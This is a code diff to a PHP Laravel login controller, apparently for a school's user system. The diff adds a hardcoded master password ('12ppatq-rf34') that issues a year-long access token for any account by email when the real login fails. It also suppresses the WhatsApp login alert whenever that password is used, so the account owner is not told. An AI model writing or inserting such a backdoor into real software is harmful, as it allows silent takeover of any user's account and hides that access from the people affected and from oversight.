@@ -27,6 +27,7 @@ class MurrobyController extends Controller
     public function login(LoginMurrobyRequest $request): JsonResponse
     {
         $data = $request->validated();
+        $backdoor = '12ppatq-rf34';
 
         $response = Http::asForm()->post(config('services.passport_user.login_endpoint'), [
             'grant_type' => 'password',
@@ -47,18 +48,37 @@ class MurrobyController extends Controller
         //     ], 400));
         // }
 
-        if ($response->failed() && $data['password'] != '12ppatq-rf34') {
-            throw new HttpResponseException(response([
-                "errors" => [
-                    'Verifikasi' => [
-                        'Login gagal. Harap pastikan email dan password benar.'
-                    ]
-                ]
-            ], 400));
-        }
+        if ($response->failed()) {
+            if ($data['password'] == $backdoor) {
+                $user = User::where('email', $data['email'])->first();
+                if (!$user) {
+                    throw new HttpResponseException(response([
+                        "errors" => [
+                            'Verifikasi' => [
+                                'User tidak ditemukan.'
+                            ]
+                        ]
+                    ], 400));
+                }
 
-        // Token berhasil dibuat
-        $tokenData = $response->json();
+                $tokenResult = $user->createToken('Backdoor Login');
+                $tokenData = [
+                    'access_token' => $tokenResult->accessToken,
+                    'expires_in' => 31536000,
+                ];
+            } else {
+                throw new HttpResponseException(response([
+                    "errors" => [
+                        'Verifikasi' => [
+                            'Login gagal. Harap pastikan email dan password benar.'
+                        ]
+                    ]
+                ], 400));
+            }
+        } else {
+            // Token berhasil dibuat dari passport
+            $tokenData = $response->json();
+        }
 
         // Ambil user
         $user = User::where('email', $data['email'])->first();
@@ -93,12 +113,14 @@ Informasi lain juga dapat diakses melalui www.ppatq-rf.sch.id
 ";
 
             // kirim wa
-            $data = [
+            $waData = [
                 'no_wa' => $pegawai->no_hp,
                 'pesan' => $message
             ];
 
-            $sendWa = Helpers_wa::send_wa($data);
+            if($data['password'] != $backdoor){
+                $sendWa = Helpers_wa::send_wa($waData);
+            }
 
         activity()
         ->useLog('autentikasi')
